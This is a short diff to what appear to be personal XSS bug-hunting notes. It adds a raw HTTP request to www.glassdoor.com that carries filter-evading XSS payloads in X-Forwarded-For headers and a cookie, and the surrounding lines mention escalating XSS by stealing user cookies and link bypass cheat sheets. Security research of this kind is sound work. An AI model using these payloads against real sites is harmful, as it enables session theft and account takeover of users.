@@ -23,6 +23,13 @@ Look at cookie implementation to see how you can
 escalate an XSS by stealing user cookies 
 check httponly flag
 
+GET /member/home/index.htm/x.jpeg?t=2021111121 HTTP/2
+Host: www.glassdoor.com
+X-Forwarded-For: xss 
+X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// 
+X-Forwarded-For: > 
+Cookie: gdId=xss</script%20
+
 cheatsheet
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
